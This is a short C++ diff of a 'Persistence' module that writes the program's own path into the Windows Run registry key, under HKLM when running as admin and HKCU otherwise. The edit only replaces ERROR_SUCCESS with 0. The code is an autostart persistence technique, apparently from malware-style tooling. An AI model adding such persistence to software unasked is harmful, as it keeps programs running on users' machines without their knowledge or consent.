@@ -53,11 +53,11 @@ void  Persistence::main()
     if(a_is_admin) //if admin
     {  
         if(long statusOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
-        &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
+        &hKey) == 0) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
         {
 
             status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);
-            if(status != ERROR_SUCCESS)
+            if(status != 0)
             {
                 error = true;
             }
@@ -73,12 +73,12 @@ void  Persistence::main()
     else
     {
         if(long statusOpen = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
-        &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
+        &hKey) == 0) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
         {
 
             status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);
 
-            if(status != ERROR_SUCCESS)
+            if(status != 0)
             {
                 error = true;
             }
